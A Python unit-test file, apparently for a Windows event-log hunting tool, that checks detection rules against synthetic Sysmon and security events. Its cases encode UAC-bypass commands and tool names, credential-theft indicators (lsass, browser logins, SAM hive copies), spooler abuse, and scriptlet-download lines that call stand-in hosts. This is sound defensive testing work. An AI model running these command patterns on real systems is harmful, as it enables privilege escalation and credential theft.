import unittest

from helpers import ev, sysmon
from winlog_hunter.rules import run_rules


SYSMON = "Microsoft-Windows-Sysmon/Operational"
WIN = "C:\\Windows\\System32\\"
USR = "C:\\Users\\Ana\\AppData\\Local\\Temp\\"
PF = "C:\\Program Files\\Proveedor\\"
IPC = r"\\*\IPC$"
IP = "192.0.2.1"


def sm(evento, segundos=0, **datos):
    return ev(evento, segundos, channel=SYSMON, **datos)


def proceso(nombre, comando="", padre="explorer.exe", **datos):
    e = sysmon(0, WIN + nombre, comando or nombre, WIN + padre)
    e.data.update(datos)
    return e


class IndicadoresEscalada(unittest.TestCase):
    def comprueba(self, regla, nivel, *eventos):
        hallazgos = run_rules(eventos, only={f"WLH-{regla:03d}"})
        if nivel:
            self.assertIn(nivel, {h.severity for h in hallazgos}, hallazgos)
        else:
            self.assertFalse(hallazgos)
        return hallazgos

    def test_uac_procesos(self):
        casos = [
            ("high", proceso("cmd.exe", padre="dllhost.exe", ParentCommandLine="dllhost /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")),
            ("medium", proceso("app.exe", padre="dllhost.exe", Image=USR+"app.exe", ParentCommandLine="dllhost /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")),
            (None, proceso("cmd.exe", padre="dllhost.exe", ParentCommandLine="dllhost /Processid:{00000000-0000-0000-0000-000000000000}")),
            ("high", proceso("cmstp.exe", f'cmstp /au "{USR}perfil.ini"')),
            ("medium", proceso("cmstp.exe", f'cmstp /s "{WIN}perfil.inf"')),
            ("high", proceso("pkgmgr.exe", f'pkgmgr /n:"{USR}perfil.xml"')),
            ("high", proceso("dism.exe", f'dism /online /apply-unattend:"{USR}perfil.xml"')),
            (None, proceso("dism.exe", f'dism /apply-unattend:"{WIN}perfil.xml"')),
            ("high", proceso("cmd.exe", padre="pkgmgr.exe")),
            ("high", proceso("cmd.exe", padre="dism.exe")),
            ("high", proceso("cmd.exe", padre="WerFault.exe")),
            ("high", proceso("cmd.exe", padre="wermgr.exe")),
            ("high", proceso("wusa.exe", r'wusa paquete.cab /extract:"C:\Windows\System32"')),
            (None, proceso("wusa.exe", r'wusa paquete.cab /extract:C:\WindowsFake')),
            ("medium", proceso("makecab.exe", f'makecab "{WIN}wscript.exe" paquete.cab')),
            ("medium", proceso("makecab.exe", "makecab wscript.exe.manifest paquete.cab")),
            (None, proceso("makecab.exe", "makecab manual.txt paquete.cab")),
            ("high", proceso("uacme.exe")),
            ("high", proceso("notepad.exe", padre="Akagi_64.exe")),
            ("high", proceso("python.exe", "python winpwnage.py")),
            ("high", proceso("python.exe", "python  winpwnage.py -u uac -i 17 -p cmd.exe")),
            ("high", proceso("cmstp.exe", padre="python.exe", ParentCommandLine="python winpwnage.py -u uac -i 17")),
            # Un script que solo cita el nombre de la herramienta no la ejecuta.
            (None, proceso("powershell.exe", "powershell -Command \"if 'winpwnage' in comando: pass\"")),
            (None, proceso("python.exe", "python editar.py", padre="powershell.exe",
                           ParentCommandLine="powershell -Command \"x = 'winpwnage' in comando.lower()\"")),
        ]
        for nivel, evento in casos:
            with self.subTest(evento=evento.data):
                self.comprueba(22, nivel, evento)

    def test_uac_ficheros_y_registro(self):
        self.comprueba(22, "medium", sm(13, Image=WIN+"DllHost.exe",
            TargetObject=r"HKLM\Software\App Paths\cmmgr32.exe\ProfileInstallPath"))
        self.comprueba(22, "medium", sm(11, Image=USR+"app.exe", TargetFilename=WIN+"wscript.exe.manifest"))
        self.comprueba(22, None, sm(11, Image=WIN+"msiexec.exe", TargetFilename=WIN+"wscript.exe.manifest"))
        self.comprueba(22, "medium", sm(11, TargetFilename=USR+"gdiplus.dll"))
        self.comprueba(22, None, sm(11, Image=PF+"setup.exe", TargetFilename=PF+"gdiplus.dll"))
        self.comprueba(22, "high", sm(7, ImageLoaded=WIN+"wow64log.dll", Signed="true"))

    def test_escalada_local_identidad(self):
        for padre, nivel in ((USR, "high"), (PF, None)):
            self.comprueba(42, nivel, proceso("whoami.exe", ParentImage=padre+"app.exe", User=r"NT AUTHORITY\SISTEMA"))
        self.comprueba(42, "medium", ev(4624, LogonType=3, IpAddress="::1",
            TargetUserName="ANONYMOUS LOGON", LogonProcessName="NtLmSsp "))
        self.comprueba(42, "medium", ev(4624, LogonType=3, IpAddress="127.0.0.1",
            TargetUserName="Ana", AuthenticationPackageName="Kerberos"))
        self.comprueba(42, None, ev(4624, LogonType=3, IpAddress="127.0.0.1",
            TargetUserName="PC$", AuthenticationPackageName="Kerberos"))
        for pipe, nivel in (("pipey", "medium"), ("srvsvc", None)):
            self.comprueba(42, nivel, ev(5145, IpAddress="::1", ShareName=IPC,
                RelativeTargetName=pipe, SubjectUserName="PC$"))
        self.comprueba(42, "high", sm(3, Image=USR+"app.exe", SourceIp="127.0.0.1",
            DestinationIp="127.0.0.1", DestinationPort=5985))
        self.comprueba(42, None, sm(3, Image=WIN+"svchost.exe", SourceIp="::1",
            DestinationIp="::1", DestinationPort=5985))
        self.comprueba(42, "high", ev(4648, ProcessName=PF+"nginx.exe"))
        self.comprueba(42, "high", ev(4624, ProcessName=PF+r"Tomcat\bin\java.exe", LogonProcessName="Advapi"))
        self.comprueba(42, None, ev(4624, ProcessName=PF+"nginx.exe", LogonProcessName="Kerberos"))

    def test_escalada_local_impresion_y_registro(self):
        spool = WIN+"spoolsv.exe"
        for clave in (
            r"HKLM\Software\Windows NT\CurrentVersion\Ports\C:\Temp\modulo.dll",
            r"HKLM\Software\Print\Printers\Impresora\SpoolDirectory",
            r"HKLM\Software\Print\Printers\Impresora\CopyFiles\modulo\Module",
        ):
            self.comprueba(42, "high", sm(13, Image=spool, TargetObject=clave))
        driver = WIN+r"spool\drivers\x64\3\New\UNIDRV.DLL"
        self.comprueba(42, "high", sm(7, Image=spool, ImageLoaded=driver, Signed="false"))
        self.comprueba(42, None, sm(7, Image=spool, ImageLoaded=driver, Signed="true"))
        self.comprueba(42, "high", sm(11, Image=spool, TargetFilename=USR+"modulo.dll"))
        self.comprueba(42, None, sm(11, Image=spool, TargetFilename=driver))
        self.comprueba(42, "high", sm(13, TargetObject=r"HKLM\WindowsUpdate\Orchestrator\UScheduler\1\pauseArg",
            Details="/c whoami"))
        clave = r"HKLM\Software\Vendor\SymbolicLinkValue"
        self.comprueba(42, "high", sm(13, Image=USR+"utilidad.exe", TargetObject=clave))
        self.comprueba(42, None, sm(13, Image=WIN+"svchost.exe", TargetObject=clave))

    def test_tarea_xml_ventana_y_padre(self):
        crear = sysmon(0, WIN+"schtasks.exe", f'schtasks /create /xml "{USR}tarea.xml" /tn "Mi tarea"', USR+"app.exe")
        ejecutar = sysmon(299, WIN+"schtasks.exe", r'schtasks /run /tn "\Mi tarea"', USR+"app.exe")
        tarde = sysmon(300, WIN+"schtasks.exe", ejecutar.get("CommandLine"), USR+"app.exe")
        otro = sysmon(1, WIN+"schtasks.exe", ejecutar.get("CommandLine"), USR+"otro.exe")
        self.comprueba(42, "medium", crear)
        temporal = sysmon(0, WIN+"schtasks.exe", f'schtasks /create /xml "{USR}tarea.tmp" /tn tarea')
        self.comprueba(42, "medium", temporal)
        self.comprueba(42, "high", crear, ejecutar)
        for e in (tarde, otro):
            self.assertEqual([h.severity for h in self.comprueba(42, "medium", crear, e)], ["medium"])

    def test_credenciales_ficheros_y_sam_remoto(self):
        objeto = USR+r"Google\Chrome\User Data\Default\Login Data"
        for id_evento in (4656, 4663):
            self.comprueba(43, "high", ev(id_evento, ObjectName=objeto, ProcessName=USR+"lector.exe"))
            self.comprueba(43, None, ev(id_evento, ObjectName=objeto, ProcessName=USR+"chrome.exe"))
            self.comprueba(43, None, ev(id_evento, ObjectName=objeto, ProcessName=PF+"lector.exe"))
        reg = ev(5145, ShareName=IPC, RelativeTargetName="winreg", IpAddress=IP, SubjectUserSid="S-1-5-21-1")
        copia = ev(5145, 1, ShareName=r"\\*\C$", AccessMask="0x120196", IpAddress=IP)
        lectura = ev(5145, 1, ShareName=r"\\*\C$", AccessMask="0x1", IpAddress=IP)
        self.comprueba(43, "high", reg, copia)
        self.comprueba(43, None, reg, lectura)
        self.comprueba(43, None, reg)
        colmenas = [ev(5145, 1, ShareName=r"\\*\C$", AccessMask="0x2", IpAddress="192.0.2.2",
                      SubjectUserSid="S-1-5-21-1", RelativeTargetName=rf"Users\p{h}")
                    for h in ("sam", "system", "security")]
        self.comprueba(43, None, reg, *colmenas[:2])
        self.comprueba(43, "high", reg, *colmenas)
        self.comprueba(43, "high", ev(5145, ShareName=IPC, RelativeTargetName="protected_storage", IpAddress=IP))
        self.comprueba(43, None, ev(5145, ShareName=IPC, RelativeTargetName="protected_storage", IpAddress="::1"))

    def test_credenciales_cuentas_y_directinput(self):
        self.comprueba(43, "high", ev(4724, TargetUserName="PC$", SubjectUserName="Admin"))
        self.comprueba(43, None, ev(4724, TargetUserName="PC$", SubjectUserName="DC$"))
        sam = "HKLM\\SAM\\SAM\\Domains\\"
        self.comprueba(43, "medium", sm(12, EventType="CreateKey", TargetObject=sam+r"Account\Users\Names\Ana"))
        self.comprueba(43, "high", sm(13, EventType="SetValue", TargetObject=sam+r"Builtin\Aliases\00000220\C"))
        self.comprueba(43, "medium", sm(13, EventType="SetValue", TargetObject=sam+r"Account\Users\000001F4\V"))
        self.comprueba(43, None, sm(13, EventType="SetValue", TargetObject=sam+r"Account\Users\00000301\V"))
        self.comprueba(43, "low", sm(13, TargetObject=r"HKLM\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal"))
        clave = r"HKU\S-1-5-21\Software\Microsoft\DirectInput\MostRecentApplication\Name"
        self.comprueba(43, "low", sm(13, TargetObject=clave, Image=USR+"juego.exe"))
        self.comprueba(43, None, sm(13, TargetObject=clave, Image=PF+"juego.exe"))
        for evento in (4624, 4625):
            self.comprueba(43, "low", ev(evento, LogonType=2, LogonProcessName="Chrome"))
        self.comprueba(43, None, ev(4624, LogonType=3, LogonProcessName="Chrome"))

    def test_ampliaciones_credenciales(self):
        lsass = r"\Device\HarddiskVolume1\Windows\System32\lsass.exe"
        for evento in (4656, 4663):
            self.comprueba(13, "critical", ev(evento, ObjectName=lsass, ProcessName=WIN+"cscript.exe", AccessMask="0x1010"))
            self.comprueba(13, None, ev(evento, ObjectName=lsass, ProcessName=WIN+"cscript.exe", AccessMask="0x1000"))
            self.comprueba(13, None, ev(evento, ObjectName=lsass, ProcessName=WIN+"wininit.exe", AccessMask="0x10"))
        sql = [ev(18456, i, channel="Application", provider="MSSQLSERVER", Data0=f"usuario{i}",
                  Data2=f"[CLIENT: {IP}]") for i in range(5)]
        self.comprueba(2, None, *sql[:4])
        self.comprueba(2, "high", *sql)
        for evento in (5805, 5827, 5828, 5829, 5830, 5831):
            self.comprueba(32, "medium" if evento == 5805 else "high", ev(evento, channel="System", provider="NETLOGON"))
        self.comprueba(32, None, ev(5805, channel="System", provider="Otro"))

    def test_smb_y_pipes(self):
        for pipe in ("spoolss", "efsrpc"):
            self.comprueba(44, "medium", ev(5145, ShareName=IPC, IpAddress=IP, RelativeTargetName=pipe))
            self.comprueba(44, None, ev(5145, ShareName=IPC, IpAddress="::1", RelativeTargetName=pipe))
        salientes = [sm(3, i, Image="System", Initiated="true", DestinationPort=445,
                        DestinationIp=f"192.0.2.{i+1}") for i in range(5)]
        self.comprueba(44, None, *salientes[:4])
        self.comprueba(44, "medium", *salientes)
        for campos in (dict(SourceIp=IP, DestinationPort=445), dict(DestinationIp=IP, SourcePort=445)):
            self.comprueba(44, "medium", salientes[0], sm(3, 59, Image="System", Initiated="false", **campos))
            self.comprueba(44, None, salientes[0], sm(3, 60, Image="System", Initiated="false", **campos))
        pipes = [sm(18, i, Image="System", PipeName=rf"\pipe{i}") for i in range(5)]
        self.comprueba(44, None, *pipes[:4])
        self.comprueba(44, "medium", *pipes)
        self.comprueba(37, "medium", ev(5145, ShareName=IPC, IpAddress=IP, RelativeTargetName="eventlog"))
        self.comprueba(37, None, ev(5145, ShareName=IPC, IpAddress="::1", RelativeTargetName="eventlog"))
        self.comprueba(28, "high", sm(17, PipeName=r"\alternativo-PC-DE-ANA-123-stdin"))
        self.comprueba(28, "low", sm(18, PipeName=r"\psexesvc-PC-123-stderr"))
        self.comprueba(28, None, sm(18, PipeName=r"\nombre-normal"))

    def test_drivers_y_cambios_de_servicio(self):
        for ruta, firma, nivel in (
            (WIN+"rwdrv.sys", "true", "high"), (WIN+"driver.sys", "false", "high"),
            (USR+"driver.sys", "true", "high"), (WIN+"WinRing0.sys", "true", "medium"),
            (PF+"driver.sys", "true", None),
            (r"C:\Program Files\Oracle\VirtualBox\VBoxDrv.sys", "true", None),
            (WIN+r"drivers\VBoxDrv.sys", "true", "high"),
        ):
            self.comprueba(45, nivel, sm(6, ImageLoaded=ruta, Signed=firma))
        ruta = WIN+r"drivers\test.sys"
        servicio = sm(13, 1, TargetObject=r"HKLM\System\CurrentControlSet\Services\Test\ImagePath",
                      Details=r"\SystemRoot\System32\drivers\test.sys")
        self.comprueba(45, None, servicio)
        self.comprueba(45, None, sm(11, Image=PF+"setup.exe", TargetFilename=ruta), servicio)
        escritura = sm(11, Image=USR+"setup.exe", TargetFilename=ruta)
        self.comprueba(45, "high", escritura)
        hallazgo, = self.comprueba(45, "high", escritura, servicio)
        self.assertEqual(hallazgo.event_count, 2)

    def test_evasion(self):
        self.comprueba(27, "high", sm(7, Image=WIN+"svchost.exe", ImageLoaded=WIN+"windowscoredeviceinfo.dll", Signed="false"))
        self.comprueba(27, "high", sm(7, Image=PF+"app.exe", ImageLoaded=PF+"wwlib.dll", Signed="false"))
        self.comprueba(27, None, sm(7, Image=PF+"app.exe", ImageLoaded=WIN+"ualapi.dll", Signed="true"))
        self.comprueba(25, "medium", proceso("attrib.exe", 'attrib +h "C:\\Temp\\test.ps1"'))
        self.comprueba(25, None, proceso("attrib.exe", "attrib +h test.txt"))
        transaccion = ev(4985, ProcessName=USR+"app.exe", ProcessId="0x10")
        self.comprueba(34, "medium", transaccion)
        self.comprueba(34, "high", transaccion, sm(25, ProcessId="16", Image=USR+"app.exe"))
        self.comprueba(34, None, ev(4985, ProcessName=PF+"app.exe", ProcessId="0x10"))
        self.comprueba(23, "medium", proceso("app.exe", Image=USR+"app.exe", Company="Microsoft Corporation", OriginalFileName="charmap.exe"))
        self.comprueba(23, "high", proceso("app.exe", Image=USR+"app.exe", Company="Microsoft Corporation", OriginalFileName="cmd.exe"))
        self.comprueba(23, "high", proceso("app.tmp", Image=USR+"app.tmp"))
        self.comprueba(23, "high", proceso("rundll32.exe", ParentImage=USR+"app.tmp"))
        self.comprueba(23, None, proceso("MSI.tmp", Image=r"C:\Windows\Installer\MSI.tmp"))
        # Inno Setup (VS Code, Git, Python...) se ejecuta siempre como is-XXXXX.tmp\<nombre>.tmp.
        inno = USR + r"is-78JVT.tmp\VSCodeUserSetup-x64-1.148.0.tmp"
        self.comprueba(23, None, proceso("setup.tmp", Image=inno))
        self.comprueba(23, None, proceso("powershell.exe", ParentImage=inno))
        self.comprueba(23, "high", proceso("app.tmp", Image=USR + r"is-78JVT.tmp\app.tmp\x.dat"))
        self.comprueba(23, None, proceso("notepad++.exe", Image=PF+"notepad++.exe"))

    def test_accesibilidad_shims_y_winsock(self):
        shim = "Microsoft-Windows-Application-Experience/Program-Telemetry"
        winsock = "Microsoft-Windows-Winsock-WS2HELP/Operational"
        self.comprueba(46, "high", proceso("net1.exe", padre="osk.exe"))
        self.comprueba(46, None, proceso("calc.exe", padre="osk.exe"))
        self.comprueba(46, "medium", ev(500, channel=shim, ExePath=WIN+"osk.exe", FixName="CorrectFilePaths"))
        # Windows aplica a diario shims propios a sus binarios: solo constan como baja.
        self.comprueba(46, "low", ev(500, channel=shim, ExePath=WIN+"backgroundTaskHost.exe", FixName="Microsoft Apps"))
        self.comprueba(46, None, ev(500, channel=shim, ExePath=USR+"app.exe"))
        self.comprueba(46, "high", proceso("sdbinst.exe", f'sdbinst "{USR}app.sdb"'))
        self.comprueba(46, None, proceso("sdbinst.exe", f'sdbinst "{PF}app.sdb"'))
        self.comprueba(46, "medium", ev(1, channel=winsock, Installer=WIN+"msiexec.exe"))
        self.comprueba(46, "low", ev(1, channel=winsock, Installer=PF+"setup.exe"))
        self.comprueba(46, None, ev(1, channel="Application", Installer=PF+"setup.exe"))

    def test_ejecucion_y_rdp(self):
        self.comprueba(24, "high", proceso("cmd.exe", f'"{WIN}cmd.exe"', "svchost.exe"))
        self.comprueba(24, None, proceso("cmd.exe", "cmd.exe /c script.bat", "svchost.exe"))
        casos = [
            ("high", proceso("alias.exe", "alias /i:http://example.test/script.sct scrobj.dll")),
            ("high", proceso("jabber.exe", r"jabber /u /s /i:http://example.test/archivo .\jabber.dll")),
            ("high", proceso("cmd.exe", padre="ftp.exe")),
            ("medium", proceso("ftp.exe", "ftp -s:comandos.txt")),
            ("high", proceso("mshta.exe", padre="iexplore.exe")),
            ("high", proceso("cscript.exe", padre="chrome.exe")),
            ("medium", proceso("explorer.exe", 'explorer /root,"C:\\Temp\\test.exe"')),
            ("medium", proceso("rundll32.exe", "rundll32 shell32.dll,Control_RunDLL test.dat")),
            ("medium", proceso("cmd.exe", ParentImage=r"C:\Windows\Installer\MSI123.tmp")),
            ("low", proceso("cmd.exe", padre="MSBuild.exe")),
            (None, proceso("ftp.exe", "ftp")),
            # Un script que contiene el texto de una prueba no ejecuta regsvr32.
            (None, proceso("powershell.exe", "powershell -Command \"t = 'regsvr32 /i:http://x/a.sct scrobj.dll'\"")),
        ]
        for nivel, evento in casos:
            with self.subTest(evento=evento.data):
                self.comprueba(11, nivel, evento)
        anterior, = self.comprueba(11, "high", proceso(
            "rundll32.exe", "rundll32 shell32.dll,Control_RunDLL ajustes.cpl"))
        self.assertNotIn("fichero ajeno", anterior.summary)
        core = "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational"
        self.comprueba(40, "high", ev(148, channel=core, ChannelName="ms_t120"))
        self.comprueba(40, None, ev(148, channel=core, ChannelName="rdpdr"))
        self.comprueba(40, None, ev(148, channel=SYSMON, ChannelName="ms_t120"))
